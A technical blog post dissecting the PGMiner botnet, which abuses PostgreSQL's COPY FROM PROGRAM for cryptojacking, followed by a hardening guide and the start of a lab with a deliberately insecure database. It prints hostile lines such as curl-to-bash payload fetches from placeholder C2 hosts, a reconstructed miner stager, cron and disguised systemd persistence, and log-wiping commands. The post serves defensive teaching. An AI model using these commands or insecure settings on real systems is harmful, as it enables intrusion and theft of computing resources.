---
tags:
  - security
  - postgresql
  - linux
  - vps
  - cryptojacking
title: "PGMiner: Anatomy of a PostgreSQL Cryptojacking Attack — From Discovery to Defense"
author: Huy Nguyen
pubDatetime: 2026-09-01T13:00:00Z
slug: pg-miner-attack
featured: true
description: "A deep dive into the PGMiner botnet — how it weaponizes PostgreSQL's COPY FROM PROGRAM to hijack VPS servers for Monero mining, the mistakes that make servers vulnerable, and a hands-on lab to simulate every step of the attack."
---

## Table of contents

---

In December 2020, Palo Alto Networks' Unit 42 published a report on a new Linux-based botnet. It was the **first known botnet delivered through PostgreSQL**. They named it **PGMiner**.

The botnet scanned the internet for port 5432, brute-forced the `postgres` superuser account, exploited PostgreSQL's `COPY FROM PROGRAM` feature to execute shell commands on the host, and silently installed a Monero cryptocurrency miner.

No CVE was needed. No zero-day was required. It was built entirely on misconfiguration.

This article walks through everything:

1. How the internet first encountered PGMiner
2. How the attack chain works under the hood on a VPS
3. Every common mistake that exposes a PostgreSQL server to this kind of attack
4. How to harden a VPS so PGMiner has no foothold
5. A hands-on lab: set up a deliberately vulnerable VPS, run a simulated attack, and see exactly what happens at every step

---

## Part 1 — How the Internet First Saw PGMiner

### The Discovery Timeline

On **December 10, 2020**, Unit 42 researchers at Palo Alto Networks published their findings. They had captured samples of a new botnet in the wild that was doing something no botnet had done before: specifically targeting and exploiting PostgreSQL database servers as its primary delivery mechanism.

```mermaid
timeline
    title PGMiner Discovery Timeline
    2019-03 : CVE-2019-9193 filed
             : PostgreSQL disputes it as "not a vulnerability"
             : COPY FROM PROGRAM is a documented superuser feature
    2020-Q3 : Attackers begin mass-scanning port 5432
             : Brute-force campaigns against default postgres accounts
    2020-12-10 : Palo Alto Networks Unit 42 publishes PGMiner report
                : First known botnet delivered through PostgreSQL
                : Mining pool already inactive at time of report
    2021-onwards : Copycat campaigns emerge
                  : Similar attacks targeting Redis, Docker, Kubernetes
```

### Why It Mattered

Before PGMiner, cryptocurrency mining botnets typically targeted well-known services like SSH (brute-forcing root), Redis (unauthenticated command execution), or Docker (exposed daemon API). PGMiner introduced PostgreSQL as a viable attack surface.

The key insight was this: PostgreSQL has a feature called `COPY FROM PROGRAM` that lets a superuser execute arbitrary OS commands. This is a **legitimate, documented feature** — not a vulnerability. But when a PostgreSQL instance is exposed to the internet with a weak password on the `postgres` superuser account, that feature becomes a remote code execution gateway.

```mermaid
flowchart LR
    subgraph "Traditional Attack Vectors"
        SSH["SSH brute-force<br/>(port 22)<br/>&nbsp;"]
        Redis["Redis unauthenticated<br/>(port 6379)<br/>&nbsp;"]
        Docker["Docker exposed API<br/>(port 2375)<br/>&nbsp;"]
    end

    subgraph "PGMiner's Innovation"
        PG["PostgreSQL brute-force<br/>(port 5432)<br/>&nbsp;"]
        COPY["COPY FROM PROGRAM<br/>= shell execution<br/>&nbsp;"]
    end

    PG --> COPY
    COPY --> RCE["Remote Code<br/>Execution<br/>&nbsp;"]

    SSH --> RCE
    Redis --> RCE
    Docker --> RCE

    RCE --> Miner["Monero Miner<br/>Deployed<br/>&nbsp;"]

    style PG fill:#ff6b6b,stroke:#c0392b,color:#fff
    style COPY fill:#ff6b6b,stroke:#c0392b,color:#fff
```

### The CVE-2019-9193 Controversy

In March 2019, CVE-2019-9193 was filed claiming that `COPY FROM PROGRAM` in PostgreSQL 9.3+ was a vulnerability. The PostgreSQL project **disputed this classification**. Their position:

> `COPY FROM PROGRAM` is a feature available only to superusers and users granted the `pg_execute_server_program` role. A superuser can already do anything on the system. This is by design.

They were right. The feature itself is not a vulnerability. The vulnerability is **giving superuser access to an attacker** through weak passwords and misconfigured authentication. But PGMiner proved that in practice, enough servers were misconfigured that the distinction was academic.

```mermaid
flowchart TD
    subgraph "The Debate"
        direction TB
        CVE["CVE-2019-9193 filed<br/>COPY FROM PROGRAM = RCE<br/>&nbsp;"]
        PGTeam["PostgreSQL team response:<br/>This is a FEATURE, not a bug<br/>&nbsp;"]
        Reality["Reality:<br/>Feature + misconfiguration = exploit<br/>&nbsp;"]
    end

    CVE --> PGTeam
    PGTeam --> Reality

    subgraph "The Analogy"
        Key["Giving your house key<br/>to a stranger<br/>&nbsp;"]
        Door["Then blaming the<br/>door manufacturer<br/>&nbsp;"]
    end

    Reality --> Key
    Key --> Door

    style CVE fill:#e74c3c,color:#fff
    style PGTeam fill:#27ae60,color:#fff
    style Reality fill:#f39c12,color:#fff
```

---

## Part 2 — How the Attack Works on a VPS (Under the Hood)

This section breaks down the full PGMiner attack chain into discrete phases. Each phase is explained with what happens at the network, operating system, and application level.

### The Complete Attack Chain

```mermaid
flowchart TD
    subgraph access["🔍 Gaining Access"]
        direction LR
        A["<b>Phase 1: Reconnaissance</b><br/>Scan internet for port 5432<br/>&nbsp;"] --> B["<b>Phase 2: Brute-Force</b><br/>Try common passwords<br/>on postgres superuser<br/>&nbsp;"]
    end

    subgraph exploit["💀 Exploitation"]
        direction LR
        C["<b>Phase 3: Initial Access</b><br/>COPY FROM PROGRAM<br/>executes shell command<br/>&nbsp;"] --> D["<b>Phase 4: Payload Download</b><br/>curl/wget fetches<br/>stager script from C2<br/>&nbsp;"]
    end

    subgraph persist["🔧 Establishing Control"]
        direction LR
        E["<b>Phase 5: Environment Prep</b><br/>Kill competing miners<br/>Clear cron jobs<br/>Disable security tools<br/>&nbsp;"] --> F["<b>Phase 6: Persistence</b><br/>Install cron job<br/>Modify system files<br/>Deploy watchdog<br/>&nbsp;"]
    end

    subgraph profit["⛏️ Monetization"]
        direction LR
        G["<b>Phase 7: Mining</b><br/>Download and run XMRig<br/>Connect to mining pool<br/>Mine Monero<br/>&nbsp;"] --> H["<b>Phase 8: Spread</b><br/>Scan for more<br/>vulnerable hosts<br/>&nbsp;"]
    end

    access --> exploit --> persist --> profit

    style A fill:#3498db,color:#fff
    style B fill:#e67e22,color:#fff
    style C fill:#e74c3c,color:#fff
    style D fill:#e74c3c,color:#fff
    style E fill:#8e44ad,color:#fff
    style F fill:#8e44ad,color:#fff
    style G fill:#2c3e50,color:#fff
    style H fill:#2c3e50,color:#fff
```

### Phase 1: Reconnaissance — Scanning for PostgreSQL

PGMiner starts by scanning large IP ranges for hosts with port **5432** open (the default PostgreSQL port). The scanning is fast and indiscriminate — it targets entire CIDR blocks of major cloud providers (AWS, Azure, GCP, DigitalOcean, etc.).

```
# What the scanner is essentially doing:
# Masscan-style sweep across cloud IP ranges
masscan 0.0.0.0/0 -p5432 --rate=10000
```

The scanner identifies hosts that respond on port 5432 with a PostgreSQL handshake. These IPs are queued for the brute-force phase.

**What happens at the network level:**

```mermaid
sequenceDiagram
    participant Scanner as PGMiner Scanner
    participant Target as Target VPS (port 5432)
    participant FW as Firewall (if any)

    Scanner->>Target: SYN to port 5432
    alt Port is open, no firewall
        Target->>Scanner: SYN-ACK
        Scanner->>Target: ACK (connection established)
        Target->>Scanner: PostgreSQL startup message
        Scanner->>Scanner: Add IP to brute-force queue
    else Port is filtered by firewall
        FW--xScanner: DROP (no response)
        Scanner->>Scanner: Skip — move to next IP
    else Port is closed
        Target->>Scanner: RST
        Scanner->>Scanner: Skip — move to next IP
    end
```

### Phase 2: Brute-Force — Cracking the postgres Account

Once a PostgreSQL server is identified, PGMiner attempts to authenticate as the **`postgres`** superuser using a list of common/default passwords. The password list typically includes:

| Priority | Password tried          | Why it works                           |
|----------|-------------------------|----------------------------------------|
| 1        | _(empty string)_        | Default on many installations          |
| 2        | `postgres`              | Username = password, extremely common  |
| 3        | `password`              | Universal bad password                 |
| 4        | `123456`                | Another universal bad password         |
| 5        | `admin`                 | Generic admin credential               |
| 6        | `root`                  | Common for Linux-minded admins         |
| 7        | `trust` (no password)   | pg_hba.conf set to trust auth method   |

The `trust` authentication method is particularly dangerous. When `pg_hba.conf` is configured with `trust` for remote connections, **no password is required at all**.

```mermaid
flowchart TD
    Start["Target IP identified<br/>port 5432 open<br/>&nbsp;"] --> TryPwd["Try password from list"]
    TryPwd --> AuthCheck{"Authentication<br/>successful?"}
    AuthCheck -->|No| NextPwd{"More passwords<br/>in list?"}
    NextPwd -->|Yes| TryPwd
    NextPwd -->|No| Skip["Skip target<br/>Move to next IP<br/>&nbsp;"]
    AuthCheck -->|Yes| CheckSuper{"Is this a<br/>superuser account?"}
    CheckSuper -->|Yes| Exploit["Proceed to<br/>exploitation phase<br/>&nbsp;"]
    CheckSuper -->|No| Skip
    
    style Exploit fill:#e74c3c,color:#fff
    style Skip fill:#27ae60,color:#fff
```

### Phase 3: Initial Access — COPY FROM PROGRAM

This is the core of the exploit. Once authenticated as a PostgreSQL superuser, PGMiner uses the `COPY FROM PROGRAM` command to execute arbitrary operating system commands.

Here is what `COPY FROM PROGRAM` is designed for:

```sql
-- Legitimate use: import data from an external command
CREATE TABLE server_info (line TEXT);
COPY server_info FROM PROGRAM 'hostname';
-- Result: inserts the server hostname into the table
```

Here is how PGMiner abuses it:

```sql
-- PGMiner's exploitation: download and execute malicious payload
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec (cmd_output TEXT);
COPY cmd_exec FROM PROGRAM 'curl -s http://malicious-c2-server/payload.sh | bash';
```

That single SQL statement causes the PostgreSQL process (running as the OS user `postgres`) to:

1. Spawn a child process
2. Execute `curl -s http://malicious-c2-server/payload.sh | bash`
3. Download a shell script from the attacker's command-and-control server
4. Execute that shell script with the privileges of the `postgres` OS user

```mermaid
sequenceDiagram
    participant Attacker as PGMiner Bot
    participant PG as PostgreSQL Server
    participant OS as Operating System
    participant C2 as C2 Server

    Attacker->>PG: SQL: DROP TABLE IF EXISTS cmd_exec
    PG->>PG: Execute DDL

    Attacker->>PG: SQL: CREATE TABLE cmd_exec (cmd_output TEXT)
    PG->>PG: Create temp table

    Attacker->>PG: SQL: COPY cmd_exec FROM PROGRAM 'curl ... | bash'
    PG->>OS: fork() + exec("curl ... | bash")
    OS->>C2: HTTP GET /payload.sh
    C2->>OS: Return malicious shell script
    OS->>OS: bash executes payload.sh
    OS->>OS: Payload runs as postgres OS user

    Note over OS: Attacker now has shell access<br/>as the postgres user
```

### Phase 4: Payload Download — The Stager Script

The initial payload downloaded is typically a **stager script** — a small shell script whose job is to prepare the environment and download the actual mining malware. PGMiner notably used multiple C2 channels:

1. **Direct HTTP** — plain curl/wget download from hardcoded IPs
2. **SOCKS5 proxies** — to obscure the true C2 server location
3. **Discord CDN** — abusing Discord's file hosting as a dead-drop for payloads
4. **Tor hidden services** — for resilient C2 infrastructure

```mermaid
flowchart TD
    subgraph "C2 Infrastructure"
        HTTP["Direct HTTP<br/>Hardcoded IP addresses<br/>&nbsp;"]
        SOCKS["SOCKS5 Proxy<br/>Obscured relay<br/>&nbsp;"]
        Discord["Discord CDN<br/>Abused file hosting<br/>&nbsp;"]
        Tor["Tor Hidden Service<br/>.onion address<br/>&nbsp;"]
    end

    Payload["Stager script<br/>needs to download miner<br/>&nbsp;"]

    Payload --> HTTP
    Payload --> SOCKS
    Payload --> Discord
    Payload --> Tor

    HTTP --> Miner["XMRig binary<br/>+ config<br/>&nbsp;"]
    SOCKS --> Miner
    Discord --> Miner
    Tor --> Miner

    style Discord fill:#5865F2,color:#fff
    style Tor fill:#7D4698,color:#fff
```

A simplified version of what the stager script does:

```bash
#!/bin/bash
# PGMiner stager script (simplified reconstruction)

# Step 1: Identify the architecture
ARCH=$(uname -m)

# Step 2: Remove traces of previous runs
rm -rf /tmp/.X11-unix /tmp/.X25-unix 2>/dev/null

# Step 3: Kill competing miners (yes, they fight each other)
pkill -f kdevtmpfsi 2>/dev/null
pkill -f kinsing 2>/dev/null
pkill -f xmrig 2>/dev/null

# Step 4: Download the appropriate miner binary
curl -o /tmp/.miner http://c2-server/xmrig_${ARCH} -s
chmod +x /tmp/.miner

# Step 5: Download mining configuration
curl -o /tmp/.config.json http://c2-server/config.json -s

# Step 6: Execute the miner
nohup /tmp/.miner -c /tmp/.config.json > /dev/null 2>&1 &
```

### Phase 5: Environment Preparation — Eliminating Competition

One of the most interesting aspects of PGMiner is its **competitive behavior**. Cryptojacking botnets compete for the same pool of vulnerable servers, so PGMiner actively kills other known mining malware before installing itself.

```mermaid
flowchart TD
    A["PGMiner payload executes"] --> B["1. Kill competing miners"]
    A --> C["2. Disable security tools"]
    A --> D["3. Clean up evidence"]

    style A fill:#8e44ad,color:#fff
    style B fill:#e74c3c,color:#fff
    style C fill:#e67e22,color:#fff
    style D fill:#2c3e50,color:#fff
```

**Step 1 — Kill competing miners:**

| Command | Target |
|---------|--------|
| `pkill -f kdevtmpfsi` | Kinsing miner |
| `pkill -f xmrig` | Generic XMRig instances |
| `pkill -f kthreaddi` | Kthreaddi miner family |
| `pkill -f sysrv` | Sysrv botnet |

**Step 2 — Disable security tools:**

| Command | Purpose |
|---------|---------|
| Stop cloud security agents | Removes Alibaba Cloud / Tencent Cloud monitoring |
| Flush iptables rules | Removes firewall rules added by other malware |
| Remove rival cron jobs | Deletes scheduled tasks from competing botnets |

**Step 3 — Clean up evidence:**

| Command | Purpose |
|---------|---------|
| `history -c && rm ~/.bash_history` | Clear bash command history |
| `rm /var/log/postgresql/*.log` | Remove PostgreSQL log entries |
| `rm /tmp/payload.sh` | Delete the downloaded stager script |

### Phase 6: Persistence — Surviving Reboots

PGMiner installs persistence mechanisms to survive reboots and manual cleanup attempts:

```bash
# Cron-based persistence
(crontab -l 2>/dev/null; echo "* * * * * curl -s http://c2/payload.sh | bash") | crontab -

# Systemd service (if running as root or with sudo)
cat > /etc/systemd/system/system-update.service << 'EOF'
[Unit]
Description=System Update Service
After=network.target

[Service]
ExecStart=/tmp/.miner -c /tmp/.config.json
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
EOF
```

```mermaid
flowchart TD
    subgraph "Persistence Mechanisms"
        Cron["Cron Job<br/>Re-downloads payload<br/>every minute<br/>&nbsp;"]
        Systemd["Systemd Service<br/>(if root access)<br/>Auto-restarts miner<br/>&nbsp;"]
        RC["rc.local / init.d<br/>Runs on boot<br/>&nbsp;"]
        Watchdog["Watchdog Process<br/>Monitors miner<br/>Restarts if killed<br/>&nbsp;"]
    end

    subgraph "Why Multiple Methods"
        Redundancy["If admin kills miner<br/>but misses cron...<br/>miner comes back<br/>&nbsp;"]
    end

    Cron --> Redundancy
    Systemd --> Redundancy
    RC --> Redundancy
    Watchdog --> Redundancy
```

### Phase 7: Mining — Monero via XMRig

The final payload is **XMRig**, a well-known open-source Monero miner. The attacker's configuration connects it to a mining pool using the attacker's wallet address.

```json
{
    "autosave": false,
    "cpu": {
        "enabled": true,
        "max-threads-hint": 75
    },
    "pools": [
        {
            "url": "pool.minexmr.com:4444",
            "user": "ATTACKER_MONERO_WALLET_ADDRESS",
            "pass": "x",
            "keepalive": true,
            "tls": false
        }
    ]
}
```

**Why Monero?** Monero (XMR) is the preferred cryptocurrency for cryptojacking because:

1. **CPU-mineable** — unlike Bitcoin, Monero's RandomX algorithm is designed for CPUs, making VPS servers viable miners
2. **Privacy by default** — all transactions are private, so stolen funds cannot be traced on the blockchain
3. **Difficult to track** — no public ledger of wallet balances

```mermaid
flowchart LR
    VPS["Compromised VPS<br/>CPU at 75-100%<br/>&nbsp;"] --> XMRig["XMRig Miner<br/>RandomX algorithm<br/>&nbsp;"]
    XMRig --> Pool["Mining Pool<br/>(e.g., minexmr.com)<br/>&nbsp;"]
    Pool --> Wallet["Attacker's Monero Wallet<br/>(untraceable)<br/>&nbsp;"]
    
    VPS2["Another compromised VPS"] --> XMRig2["XMRig"] --> Pool
    VPS3["Another compromised VPS"] --> XMRig3["XMRig"] --> Pool
    VPS4["Hundreds more VPS..."] --> Pool

    Wallet --> Exchange["Convert to BTC/USD<br/>through anonymous exchange<br/>&nbsp;"]

    style VPS fill:#e74c3c,color:#fff
    style VPS2 fill:#e74c3c,color:#fff
    style VPS3 fill:#e74c3c,color:#fff
    style VPS4 fill:#e74c3c,color:#fff
    style Wallet fill:#2c3e50,color:#fff
```

### Phase 8: Lateral Spread

After establishing itself on one host, PGMiner scans the local network and the broader internet for more vulnerable PostgreSQL instances, starting the cycle again.

---

## Part 3 — Every Mistake That Exposes Your VPS to PGMiner

This section catalogs every common misconfiguration that makes a PostgreSQL VPS vulnerable to PGMiner or similar attacks. If you find yourself in any of these situations, you are at risk.

| Category | Mistake | Risk Level |
|----------|---------|------------|
| 🔴 **Authentication** | Weak/default password on `postgres` | CRITICAL |
| 🔴 **Authentication** | `trust` authentication for remote hosts | CRITICAL |
| 🔴 **Authentication** | No password set at all | CRITICAL |
| 🟠 **Network** | Port 5432 open to `0.0.0.0/0` | CRITICAL |
| 🟠 **Network** | No firewall configured | HIGH |
| 🟠 **Network** | No VPN/SSH tunnel for DB access | HIGH |
| 🟣 **Operating System** | Running PostgreSQL as `root` | CRITICAL |
| 🟣 **Operating System** | No resource limits (cgroups) | MEDIUM |
| 🟣 **Operating System** | No SELinux/AppArmor | MEDIUM |
| 🔵 **Database Config** | Default `postgres` superuser active remotely | HIGH |
| 🔵 **Database Config** | `pg_execute_server_program` granted broadly | HIGH |
| 🔵 **Database Config** | No connection logging | MEDIUM |
| 🟢 **Operational** | No monitoring or alerting | MEDIUM |
| 🟢 **Operational** | No regular security audits | MEDIUM |
| 🟢 **Operational** | Unpatched PostgreSQL version | HIGH |

### Mistake 1: Using Default or Weak Passwords

This is the single most common enabler. Many PostgreSQL installations ship with the `postgres` superuser account having either no password or the password `postgres`.

```bash
# How to check if your postgres user has a weak password:
sudo -u postgres psql -c "SELECT usename, passwd IS NOT NULL as has_password FROM pg_shadow WHERE usename = 'postgres';"
```

**Risk level: CRITICAL** — This alone is enough for PGMiner to compromise your server.

### Mistake 2: Trust Authentication in pg_hba.conf

The `pg_hba.conf` file controls who can connect and how they authenticate. The `trust` authentication method means **no password is required**.

```conf
# DANGEROUS — anyone from any IP can connect without a password:
host    all    all    0.0.0.0/0    trust

# SAFE — require scram-sha-256 authentication:
host    all    all    127.0.0.1/32    scram-sha-256
```

### Mistake 3: Exposing Port 5432 to the Internet

PostgreSQL's default port 5432 should never be directly accessible from the public internet. There is almost never a legitimate reason for this.

```bash
# Check if port 5432 is listening on all interfaces:
ss -tlnp | grep 5432
# If you see 0.0.0.0:5432 — you are exposed
# You want to see 127.0.0.1:5432
```

### Mistake 4: Running PostgreSQL as Root

If PostgreSQL runs as root, then `COPY FROM PROGRAM` executes commands **as root**. The attacker gets full system access immediately, not just access as the `postgres` user.

```bash
# Check which user PostgreSQL runs as:
ps aux | grep postgres | head -3
# It should show user 'postgres', NOT 'root'
```

### Mistake 5: No Firewall Rules

Running a VPS without a firewall is like leaving your front door open. Every port is exposed to every scanner on the internet.

```bash
# Check if ufw (Uncomplicated Firewall) is active:
sudo ufw status
# If it says 'inactive' — you have no firewall
```

### Mistake 6: Leaving postgresql.conf listen_addresses as '*'

```conf
# In postgresql.conf:
# DANGEROUS:
listen_addresses = '*'

# SAFE — only listen on localhost:
listen_addresses = 'localhost'
```

### Mistake 7: Not Revoking pg_execute_server_program

Even if you need remote database access, you can specifically revoke the ability to run `COPY FROM PROGRAM`:

```sql
-- Revoke the ability to execute programs from non-superusers:
REVOKE pg_execute_server_program FROM PUBLIC;
```

### Mistake 8: No Connection Logging

If you do not log connections, you will not know when an attacker is brute-forcing your database.

```conf
# In postgresql.conf:
log_connections = on
log_disconnections = on
log_failed_authentication = on  -- PostgreSQL 15+
```

### Mistake 9: No CPU/Resource Monitoring

A cryptominer will spike your CPU to 75-100%. Without monitoring, this can go unnoticed for months while you pay inflated cloud bills.

---

## Part 4 — How to Prevent PGMiner (Hardening Guide)

This section is a complete hardening checklist. Each item directly counters one or more attack phases.

```mermaid
flowchart LR
    subgraph "Attack Phase"
        P1["Scanning<br/>port 5432<br/>&nbsp;"]
        P2["Brute-force<br/>password<br/>&nbsp;"]
        P3["COPY FROM PROGRAM<br/>execution<br/>&nbsp;"]
        P4["Payload download<br/>from C2<br/>&nbsp;"]
        P5["Miner execution<br/>and persistence<br/>&nbsp;"]
    end

    subgraph "Defense"
        D1["Firewall<br/>Block 5432 from internet<br/>&nbsp;"]
        D2["Strong password<br/>+ scram-sha-256<br/>&nbsp;"]
        D3["Revoke<br/>pg_execute_server_program<br/>&nbsp;"]
        D4["Egress filtering<br/>Block outbound to unknown<br/>&nbsp;"]
        D5["Resource limits<br/>+ monitoring<br/>&nbsp;"]
    end

    D1 -.->|blocks| P1
    D2 -.->|blocks| P2
    D3 -.->|blocks| P3
    D4 -.->|blocks| P4
    D5 -.->|detects| P5

    style D1 fill:#27ae60,color:#fff
    style D2 fill:#27ae60,color:#fff
    style D3 fill:#27ae60,color:#fff
    style D4 fill:#27ae60,color:#fff
    style D5 fill:#27ae60,color:#fff

    style P1 fill:#e74c3c,color:#fff
    style P2 fill:#e74c3c,color:#fff
    style P3 fill:#e74c3c,color:#fff
    style P4 fill:#e74c3c,color:#fff
    style P5 fill:#e74c3c,color:#fff
```

### Defense 1: Firewall — Block Port 5432 from the Internet

This single step stops the attack at Phase 1. If the scanner cannot reach port 5432, nothing else matters.

```bash
# Using UFW (Ubuntu/Debian):
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow ssh
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
# DO NOT add: sudo ufw allow 5432/tcp
sudo ufw enable

# If you need remote DB access, allow only specific IPs:
sudo ufw allow from 203.0.113.50 to any port 5432

# Using iptables directly:
sudo iptables -A INPUT -p tcp --dport 5432 -s 203.0.113.50 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 5432 -j DROP
```

### Defense 2: Strong Password + SCRAM-SHA-256

```bash
# Set a strong password for the postgres user:
sudo -u postgres psql -c "ALTER USER postgres WITH PASSWORD 'USE-A-REAL-STRONG-PASSWORD-HERE';"

# In pg_hba.conf, enforce scram-sha-256:
# Replace any line that says 'trust' or 'md5' with:
# host  all  all  127.0.0.1/32  scram-sha-256

# In postgresql.conf, set the default auth method:
# password_encryption = scram-sha-256
```

### Defense 3: Bind to Localhost Only

```conf
# In postgresql.conf:
listen_addresses = 'localhost'
```

If you need remote access, use an **SSH tunnel** instead of exposing PostgreSQL directly:

```bash
# From your local machine:
ssh -L 5432:localhost:5432 user@your-vps-ip
# Now connect to localhost:5432 on your local machine
# Traffic goes through the encrypted SSH tunnel
```

### Defense 4: Revoke COPY FROM PROGRAM

```sql
-- For all non-superuser roles:
REVOKE pg_execute_server_program FROM PUBLIC;

-- Create application-specific roles with minimal privileges:
CREATE ROLE app_user WITH LOGIN PASSWORD 'strong-password';
GRANT CONNECT ON DATABASE myapp TO app_user;
GRANT SELECT, INSERT, UPDATE, DELETE ON ALL TABLES IN SCHEMA public TO app_user;
-- This role cannot use COPY FROM PROGRAM
```

### Defense 5: Enable Logging and Monitoring

```conf
# In postgresql.conf:
log_connections = on
log_disconnections = on
log_statement = 'ddl'
log_min_duration_statement = 1000  # Log slow queries (ms)

# Connection rate limiting in pg_hba.conf is not built-in,
# but fail2ban can monitor PostgreSQL logs for brute-force:
```

```bash
# Install fail2ban for PostgreSQL brute-force protection:
sudo apt install fail2ban

# Create /etc/fail2ban/filter.d/postgresql.conf:
cat << 'EOF' | sudo tee /etc/fail2ban/filter.d/postgresql.conf
[Definition]
failregex = FATAL:  password authentication failed for user .* <HOST>
            FATAL:  no pg_hba.conf entry for host "<HOST>"
ignoreregex =
EOF

# Create /etc/fail2ban/jail.d/postgresql.conf:
cat << 'EOF' | sudo tee /etc/fail2ban/jail.d/postgresql.conf
[postgresql]
enabled  = true
port     = 5432
filter   = postgresql
logpath  = /var/log/postgresql/postgresql-*-main.log
maxretry = 5
bantime  = 3600
EOF

sudo systemctl restart fail2ban
```

### Defense 6: Resource Limits with cgroups

Even if an attacker gets through, resource limits can prevent a miner from consuming all CPU:

```bash
# Limit PostgreSQL to 50% CPU using systemd cgroups:
sudo systemctl edit postgresql

# Add these lines:
# [Service]
# CPUQuota=50%
# MemoryMax=2G
```

### Defense 7: Egress Filtering

Block the server from making outbound connections to unknown hosts. This prevents the stager from downloading the miner payload.

```bash
# Allow outbound only to known destinations:
sudo iptables -A OUTPUT -d apt.ubuntu.com -j ACCEPT
sudo iptables -A OUTPUT -d security.ubuntu.com -j ACCEPT
# ... add your known destinations
sudo iptables -A OUTPUT -p tcp --dport 80 -j DROP
sudo iptables -A OUTPUT -p tcp --dport 443 -j DROP
```

### Complete Hardening Checklist

```mermaid
flowchart TD
    subgraph "Layer 1: Network"
        N1["✅ Firewall blocks port 5432<br/>from public internet<br/>&nbsp;"]
        N2["✅ PostgreSQL listens on<br/>localhost only<br/>&nbsp;"]
        N3["✅ SSH tunnel for<br/>remote access<br/>&nbsp;"]
        N4["✅ Egress filtering<br/>blocks unknown outbound<br/>&nbsp;"]
    end

    subgraph "Layer 2: Authentication"
        A1["✅ Strong password on<br/>postgres superuser<br/>&nbsp;"]
        A2["✅ SCRAM-SHA-256<br/>authentication enforced<br/>&nbsp;"]
        A3["✅ No trust auth<br/>for any remote host<br/>&nbsp;"]
        A4["✅ fail2ban monitors<br/>brute-force attempts<br/>&nbsp;"]
    end

    subgraph "Layer 3: Authorization"
        Z1["✅ pg_execute_server_program<br/>revoked from PUBLIC<br/>&nbsp;"]
        Z2["✅ Application uses<br/>minimal-privilege role<br/>&nbsp;"]
        Z3["✅ Superuser access<br/>restricted to localhost<br/>&nbsp;"]
    end

    subgraph "Layer 4: Monitoring"
        M1["✅ Connection logging enabled"]
        M2["✅ CPU monitoring with alerts"]
        M3["✅ Regular security audits"]
        M4["✅ Process monitoring<br/>for unknown binaries<br/>&nbsp;"]
    end

    N1 --> A1
    A1 --> Z1
    Z1 --> M1

    style N1 fill:#27ae60,color:#fff
    style N2 fill:#27ae60,color:#fff
    style N3 fill:#27ae60,color:#fff
    style N4 fill:#27ae60,color:#fff
    style A1 fill:#2980b9,color:#fff
    style A2 fill:#2980b9,color:#fff
    style A3 fill:#2980b9,color:#fff
    style A4 fill:#2980b9,color:#fff
    style Z1 fill:#8e44ad,color:#fff
    style Z2 fill:#8e44ad,color:#fff
    style Z3 fill:#8e44ad,color:#fff
    style M1 fill:#f39c12,color:#fff
    style M2 fill:#f39c12,color:#fff
    style M3 fill:#f39c12,color:#fff
    style M4 fill:#f39c12,color:#fff
```

---

## Part 5 — Hands-On Lab: Simulate a PGMiner Attack

> **⚠️ DISCLAIMER**: This lab is for **educational purposes only**. Never run this against systems you do not own. The simulated attack uses **harmless commands** — no actual malware or cryptocurrency miners are involved. The goal is to understand each step of the attack chain by observing it firsthand.

This lab has two parts:
1. **Set up a deliberately vulnerable PostgreSQL VPS** (using Docker for isolation)
2. **Run a simulated PGMiner attack script** that replicates each phase with safe, observable commands

### Lab Setup: The Vulnerable VPS

We will use Docker to create an isolated, deliberately misconfigured PostgreSQL server. This is safer than misconfiguring an actual VPS.

```bash
#!/bin/bash
# File: lab-setup.sh
# Purpose: Create a deliberately vulnerable PostgreSQL instance for PGMiner lab
# Run this on your LOCAL machine — never on a production server

set -e

echo "=== PGMiner Attack Lab Setup ==="
echo "Creating deliberately vulnerable PostgreSQL instance..."
echo ""

# Create a directory for the lab
mkdir -p pgminer-lab && cd pgminer-lab

# Create a deliberately insecure pg_hba.conf
cat > pg_hba.conf << 'EOF'
# TYPE  DATABASE  USER  ADDRESS       METHOD
# This is DELIBERATELY INSECURE for the lab.
# Mistake 1: trust authentication for all remote connections
# Mistake 2: all databases, all users, any IP
local   all       all                 trust
host    all       all   0.0.0.0/0     trust
host    all       all   ::/0          trust
EOF

# Create a postgresql.conf override
cat > postgresql.conf.override << 'EOF'
# DELIBERATELY INSECURE for the lab
# Mistake 3: listen on all interfaces
listen_addresses = '*'
# Mistake 4: no connection logging
log_connections = off
log_disconnections = off
EOF

# Create docker-compose.yml
cat > docker-compose.yml << 'EOF'
version: '3.8'
services:
  vulnerable-postgres:
    image: postgres:15
    container_name: pgminer-lab-db
    environment:
      # Mistake 5: weak password
      POSTGRES_PASSWORD: postgres
    ports:
      # Mistake 6: exposed to host network
      - "15432:5432"
    volumes:
      - ./pg_hba.conf:/var/lib/postgresql/pg_hba.conf
      - ./postgresql.conf.override:/var/lib/postgresql/postgresql.conf.override
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    command: >
      postgres
      -c hba_file=/var/lib/postgresql/pg_hba.conf
      -c config_file=/var/lib/postgresql/postgresql.conf.override
      -c listen_addresses='*'
      -c log_connections=off
EOF

# Create init.sql to set up the database
cat > init.sql << 'EOF'
-- This runs when the container first starts
-- Create a dummy application database
CREATE DATABASE myapp;
\c myapp;

CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(50),
    email VARCHAR(100),
    created_at TIMESTAMP DEFAULT NOW()
);

INSERT INTO users (username, email) VALUES
('alice', 'alice@example.com'),
('bob', 'bob@example.com'),
('charlie', 'charlie@example.com');

-- Log that setup is complete
DO $$
BEGIN
    RAISE NOTICE 'Vulnerable lab database initialized successfully';
END $$;
EOF

echo "Starting vulnerable PostgreSQL container..."
docker compose up -d

echo ""
echo "Waiting for PostgreSQL to be ready..."
sleep 5

# Verify the setup
echo ""
echo "=== Verification ==="
echo "Testing connection with weak password..."
PGPASSWORD=postgres psql -h 127.0.0.1 -p 15432 -U postgres -c "SELECT version();" 2>/dev/null && \
    echo "✅ Connection successful — server is vulnerable!" || \
    echo "❌ Connection failed — check Docker logs"

echo ""
echo "Testing trust authentication (no password)..."
psql -h 127.0.0.1 -p 15432 -U postgres -c "SELECT 'trust auth works';" 2>/dev/null && \
    echo "✅ Trust auth confirmed — no password needed!" || \
    echo "⚠️  Trust auth test inconclusive"

echo ""
echo "=== Lab Ready ==="
echo "Vulnerable PostgreSQL is running on localhost:15432"
echo "Username: postgres"
